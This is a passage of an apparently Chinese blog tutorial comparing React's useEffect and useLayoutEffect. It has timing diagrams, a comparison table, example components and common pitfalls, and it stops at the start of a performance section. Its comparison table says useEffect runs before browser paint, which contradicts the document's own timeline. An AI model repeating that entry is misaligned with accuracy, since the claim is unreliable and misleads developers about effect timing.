                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"☂"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"✓"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"➤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">useEffect vs useLayoutEffect 完全指南</h2>
<h3 data-id="heading-1">🎯 核心区别：执行时机</h3>
<h4 data-id="heading-2">useEffect（异步副作用）</h4>
<pre><code class="hljs language-markdown" lang="markdown">React 渲染 DOM
<span class="hljs-code">    ↓
浏览器绘制屏幕
    ↓
执行 useEffect ← 用户已经看到 DOM
    ↓
可能导致屏幕闪烁
</span></code></pre>
<h4 data-id="heading-3">useLayoutEffect（同步副作用）</h4>
<pre><code class="hljs language-markdown" lang="markdown">React 渲染 DOM
<span class="hljs-code">    ↓
执行 useLayoutEffect ← 立即同步执行
    ↓
浏览器绘制屏幕（已是最终效果）
    ↓
用户看到最终结果（无闪烁）
</span></code></pre>
<hr/>
<h3 data-id="heading-4">📊 详细对比表</h3>








































<table><thead><tr><th>特性</th><th>useEffect</th><th>useLayoutEffect</th></tr></thead><tbody><tr><td><strong>执行时机</strong></td><td>DOM 更新后，<strong>浏览器绘制前</strong></td><td>DOM 更新后，<strong>立即同步执行</strong></td></tr><tr><td><strong>阻塞渲染</strong></td><td>❌ 不阻塞</td><td>✅ 会阻塞浏览器绘制</td></tr><tr><td><strong>性能</strong></td><td>⭐⭐⭐⭐⭐ 更好</td><td>⭐⭐⭐ 可能卡顿</td></tr><tr><td><strong>使用频率</strong></td><td>99% 的情况用这个</td><td>特定场景用</td></tr><tr><td><strong>服务端渲染</strong></td><td>✅ 支持</td><td>❌ 会报警告</td></tr><tr><td><strong>清理函数执行</strong></td><td>DOM 更新前执行</td><td>DOM 更新前执行</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">🔴 useEffect 执行时间线</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. useEffect 执行'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. useEffect 清理函数'</span>);
  }, []);

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'0. 组件渲染'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}

<span class="hljs-comment">// 执行顺序：</span>
<span class="hljs-comment">// 0. 组件渲染</span>
<span class="hljs-comment">// 1. useEffect 执行</span>
<span class="hljs-comment">// 2. useEffect 清理函数（卸载或依赖变化时）</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">🟠 useLayoutEffect 执行时间线</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. useLayoutEffect 执行（同步）'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. useLayoutEffect 清理函数'</span>);
  }, []);

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'0. 组件渲染'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}

<span class="hljs-comment">// 执行顺序：</span>
<span class="hljs-comment">// 0. 组件渲染</span>
<span class="hljs-comment">// 1. useLayoutEffect 执行（同步，阻塞浏览器绘制）</span>
<span class="hljs-comment">// 浏览器绘制屏幕</span>
<span class="hljs-comment">// 2. useLayoutEffect 清理函数</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">💡 常用场景 &amp; 代码示例</h3>
<h4 data-id="heading-8">场景1️⃣：数据请求（useEffect）✅ 推荐</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">// 异步获取数据</span>
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
        <span class="hljs-title function_">setUser</span>(data);
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'加载失败:'</span>, err);
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
      });
  }, [userId]);  <span class="hljs-comment">// userId 变化时重新获取</span>

  <span class="hljs-keyword">if</span> (loading) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user?.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>为什么用 useEffect？</strong></p>
<ul>
<li>数据获取是异步操作，不需要同步阻塞</li>
<li>用户看到加载状态很正常</li>
</ul>
<hr/>
<h4 data-id="heading-9">场景2️⃣：事件监听（useEffect）✅ 推荐</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">WindowResize</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [width, setWidth] = <span class="hljs-title function_">useState</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResize</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">setWidth</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);
    }

    <span class="hljs-comment">// 添加监听</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize);

    <span class="hljs-comment">// 清理：移除监听</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize);
    };
  }, []);  <span class="hljs-comment">// 只在挂载时运行</span>

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>窗口宽度: {width}px<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>为什么用 useEffect？</strong></p>
<ul>
<li>事件监听是异步的，不需要同步执行</li>
<li>必须清理事件监听器，防止内存泄漏</li>
</ul>
<hr/>
<h4 data-id="heading-10">场景3️⃣：DOM 测量（useLayoutEffect）✅ 正确</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MeasureElement</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> ref = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [height, setHeight] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 必须用 useLayoutEffect，否则会闪烁</span>
    <span class="hljs-comment">// 1. 测量 DOM 尺寸</span>
    <span class="hljs-keyword">const</span> rect = ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-comment">// 2. 基于尺寸计算布局</span>
    <span class="hljs-keyword">const</span> newHeight = rect.<span class="hljs-property">width</span> &gt; <span class="hljs-number">500</span> ? <span class="hljs-number">300</span> : <span class="hljs-number">150</span>;
    
    <span class="hljs-comment">// 3. 立即更新（在浏览器绘制前）</span>
    <span class="hljs-title function_">setHeight</span>(newHeight);
  }, []);  <span class="hljs-comment">// 只在挂载时运行</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">height</span>}<span class="hljs-attr">px</span>` }}&gt;</span>
      响应式高度
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>为什么用 useLayoutEffect？</strong></p>
<ul>
<li>需要在浏览器绘制前完成 DOM 测量和布局计算</li>
<li>如果用 useEffect，用户会看到高度从 0 闪到 300（闪烁！）</li>
</ul>
<hr/>
<h4 data-id="heading-11">场景4️⃣：表单焦点设置（useLayoutEffect）✅ 正确</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AutoFocusForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 必须用 useLayoutEffect，否则表单打开时看不到光标在哪</span>
    inputRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">focus</span>();
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"自动聚焦"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>为什么用 useLayoutEffect？</strong></p>
<ul>
<li>如果用 useEffect，用户会看到输入框出现，然后光标才聚焦（视觉延迟）</li>
<li>useLayoutEffect 保证光标在浏览器绘制前已经聚焦</li>
</ul>
<hr/>
<h4 data-id="heading-12">场景5️⃣：动画初始化（useLayoutEffect）✅ 正确</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnimatedBox</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> boxRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 设置初始状态（隐藏）</span>
    gsap.<span class="hljs-title function_">set</span>(boxRef.<span class="hljs-property">current</span>, { <span class="hljs-attr">opacity</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">x</span>: -<span class="hljs-number">50</span> });
    
    <span class="hljs-comment">// 然后执行动画</span>
    gsap.<span class="hljs-title function_">to</span>(boxRef.<span class="hljs-property">current</span>, { 
      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span>, 
      <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, 
      <span class="hljs-attr">duration</span>: <span class="hljs-number">0.5</span> 
    });
  }, []);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{boxRef}</span>&gt;</span>动画盒子<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>为什么用 useLayoutEffect？</strong></p>
<ul>
<li>避免用户看到初始未变换的状态，然后才动画</li>
<li>useLayoutEffect 保证在浏览器绘制前完成初始设置</li>
</ul>
<hr/>
<h4 data-id="heading-13">场景6️⃣：主题切换（useLayoutEffect）⚠️ 特殊</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeProvider</span>(<span class="hljs-params">{ theme }</span>) {
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 立即应用主题，避免闪烁</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">colorScheme</span> = theme;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">className</span> = <span class="hljs-string">`theme-<span class="hljs-subst">${theme}</span>`</span>;
  }, [theme]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>为什么用 useLayoutEffect？</strong></p>
<ul>
<li>防止主题切换时的闪烁（深色→浅色 的白屏闪烁）</li>
</ul>
<hr/>
<h3 data-id="heading-14">📋 依赖数组详解</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1️⃣ 每次渲染都执行（没有依赖数组）</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'每次都运行'</span>);
});

<span class="hljs-comment">// 2️⃣ 只在挂载时执行（空依赖数组）</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'只在挂载时执行'</span>);
}, []);

<span class="hljs-comment">// 3️⃣ 依赖值变化时执行</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'userId 变化时执行'</span>);
}, [userId]);

<span class="hljs-comment">// 4️⃣ 多个依赖</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'userId 或 pageNum 变化时执行'</span>);
}, [userId, pageNum]);

<span class="hljs-comment">// 5️⃣ 依赖是对象时的坑</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ❌ 每次都会执行，因为 {} 每次都是新的</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'可能无限循环'</span>);
}, [{}]);

<span class="hljs-comment">// ✅ 正确做法：使用 useMemo</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({}), []);
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'config 稳定，不会无限循环'</span>);
}, [config]);
</code></pre>
<hr/>
<h3 data-id="heading-15">⚠️ 常见陷阱</h3>
<h4 data-id="heading-16">陷阱1️⃣：useLayoutEffect 导致卡顿</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 不好：useLayoutEffect 中做复杂计算会阻塞绘制</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 这会冻结浏览器！</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
    <span class="hljs-title function_">complexCalculation</span>();
  }
}, []);

<span class="hljs-comment">// ✅ 好：复杂计算放到 useEffect</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
    <span class="hljs-title function_">complexCalculation</span>();
  }
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-17">陷阱2️⃣：useLayoutEffect 在服务端渲染中报错</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 错：SSR 时会报警告</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// SSR 中不能执行</span>
}, []);

<span class="hljs-comment">// ✅ 好：检测环境</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span>) {
    <span class="hljs-comment">// 客户端代码</span>
  }
}, []);

<span class="hljs-comment">// 或者条件性使用</span>
<span class="hljs-keyword">const</span> useIsomorphicLayoutEffect = 
  <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> ? useLayoutEffect : useEffect;

<span class="hljs-title function_">useIsomorphicLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 自动适配 SSR</span>
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-18">陷阱3️⃣：忘记清理副作用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 坏：内存泄漏</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'每秒执行'</span>);
  }, <span class="hljs-number">1000</span>);
  <span class="hljs-comment">// 没有清理！</span>
}, []);

<span class="hljs-comment">// ✅ 好：返回清理函数</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'每秒执行'</span>);
  }, <span class="hljs-number">1000</span>);
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);  <span class="hljs-comment">// 清理定时器</span>
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-19">陷阱4️⃣：无限循环</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 坏：无限循环</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 每次都修改 count</span>
}, [count]);  <span class="hljs-comment">// 导致重新渲染，又触发 effect</span>

<span class="hljs-comment">// ✅ 好：不把更新的值放在依赖中</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);
}, []);  <span class="hljs-comment">// 空依赖，只执行一次</span>
</code></pre>
<hr/>
<h3 data-id="heading-20">🚀 选择流程图</h3>
<pre><code class="hljs language-markdown" lang="markdown">需要执行副作用？
<span class="hljs-code">    ↓
是异步操作（数据获取、定时器）?
    ├─ 是 → useEffect ✅
    └─ 否 ↓
    
需要在浏览器绘制前同步执行？
    ├─ 是 → useLayoutEffect ✅
    │   例：DOM 测量、焦点、动画、主题
    └─ 否 → useEffect ✅（默认选择）
</span></code></pre>
<hr/>
<h3 data-id="heading-21">📊 性能对比</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 测试性能影响</span>

